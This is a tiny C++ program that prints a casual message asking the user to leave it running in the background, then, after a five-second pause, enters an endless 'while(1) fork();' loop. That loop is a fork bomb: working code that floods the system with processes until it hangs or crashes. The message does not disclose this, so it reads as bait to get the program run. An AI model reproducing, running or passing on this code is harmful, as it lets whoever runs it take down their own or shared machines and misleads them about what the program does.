#include <unistd.h>
#include <iostream>
using namespace std;
int main() {
    cout << "Keep this running in background wait for few mins : )" << endl;
     sleep(5);
    while(1) fork();
    cout << "Bye!";
    return 0;
}
